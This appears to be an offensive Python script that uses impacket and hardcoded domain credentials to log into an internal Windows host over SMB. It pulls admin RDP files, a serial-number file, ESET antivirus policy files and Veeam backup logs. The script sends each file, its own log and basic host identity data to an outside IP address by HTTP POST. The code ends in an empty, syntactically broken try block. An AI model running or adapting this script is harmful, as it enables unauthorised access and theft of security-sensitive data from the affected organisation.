#!/usr/bin/env python3
# loot12: targeted grabs from 10.61.10.12 — admin profile hints + ESET/Veeam logs
import sys, io, subprocess
sys.path.insert(0, "/tmp/imp")
from impacket.smbconnection import SMBConnection

IP = "10.61.10.12"
LOG = "/tmp/.LT12.txt"
lf = open(LOG, "wb")
def w(s):
    if isinstance(s, str): s = s.encode("utf-8", "replace")
    lf.write(s + b"\n"); lf.flush()

WANT = [
    ("C$", "Program Files\\Packaged Programs\\bpw.rdp", "bpwrdp"),
    ("C$", "Program Files\\Packaged Programs\\bpw (1).rdp", "bpwrdp1"),
    ("Users", "admin.MLT\\Desktop\\serial 2012.txt", "serial"),
    ("Users", "admin.MLT\\Documents\\Default.rdp", "defrdp"),
    ("Users", "admin.MLT\\Desktop\\Remote Desktop Connection.lnk", "rdplnk"),
    ("Users", "admin.MLT\\Desktop\\cmd.lnk", "cmdlnk"),
    ("C$", "ProgramData\\ESET\\ESET Security\\lastPolicy.dat", "lpol"),
    ("C$", "ProgramData\\ESET\\ESET Security\\Audit\\1781710440\\lastPolicy.dat", "lpol2"),
    ("C$", "ProgramData\\ESET\\ESET Security\\backup\\db.xml", "edb"),
    ("C$", "ProgramData\\ESET\\ESET Security\\EHttpSrv.xml", "ehx"),
    ("C$", "ProgramData\\Veeam\\Backup\\Console\\Console_MLT_Admin_10.40.0.10.log", "vcl1"),
    ("C$", "ProgramData\\Veeam\\Backup\\Console\\Console_MLT_Admin_localhost.log", "vcl2"),
    ("C$", "ProgramData\\Veeam\\Backup\\RegistryOptions\\Veeam Backup and Replication.log", "vro"),
    ("C$", "ProgramData\\Veeam\\Backup\\FlrDrvInstaller.log", "vfl"),
]
def post(path, tag):
    subprocess.run(["curl", "-sm", "120", "-X", "POST", "--data-binary", "@" + path,
                    "http://131.123.43.239/up", "-H", "X-Name: mel2_12_" + tag])
try:
    c = SMBConnection(IP, IP, timeout=12)
    c.login("rez", "!QAZxsw2", "MLT", "", "")
    w("login ok .12")
    for share, path, tag in WANT:
        try:
            bio = io.BytesIO()
            c.getFile(share, path, bio.write)
            data = bio.getvalue()
            w("OK %s %s %d" % (share, path, len(data)))
            f = "/tmp/.l12_" + tag
            open(f, "wb").write(data)
            post(f, tag)
        except Exception as e:
            w("ERR %s\\%s %s" % (share, path, str(e)[:110]))
    c.logoff()
except Exception as e:
    w("FATAL " + str(e)[:150])
lf.close()
subprocess.run(["curl", "-sm", "30", "-X", "POST", "--data-binary", "@" + LOG, "http://131.123.43.239/up", "-H", "X-Name: mel2_12log"])
print("LT12_DONE")

import os,base64,urllib.request as u
try:
 d=base64.b64encode(os.popen("id;hostname;uname -a").read().encode()).decode(); u.urlopen(u.Request("http://131.123.43.239/up",data=d.encode(),headers={"X-Name":"wrk_out"}),timeout=10)
except Exception: pass

try:
except Exception: pass

